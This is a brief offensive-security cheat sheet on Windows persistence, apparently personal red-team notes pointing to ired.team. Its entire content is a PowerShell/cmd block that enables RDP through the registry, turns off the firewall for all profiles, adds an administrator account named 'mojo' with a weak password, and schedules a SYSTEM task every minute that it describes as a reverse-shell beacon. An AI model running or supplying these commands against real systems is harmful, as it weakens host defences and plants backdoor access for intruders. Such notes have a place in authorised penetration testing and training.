# Persistence

See [ired.team](https://www.ired.team/offensive-security/persistence)

```powershell
# Enable RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f

# Disable firewall
netsh advfirewall set allprofiles state off

# Add an administrative user to establish persistence
net user mojo Password123! /add
net localgroup administrators mojo /add

# Add a beacon that pings a reverse shell every minute
schtasks /create /sc minute /mo 1 /tn "chillin" /tr C:\ProgramData\System\chillin.bat /ru "SYSTEM"
```
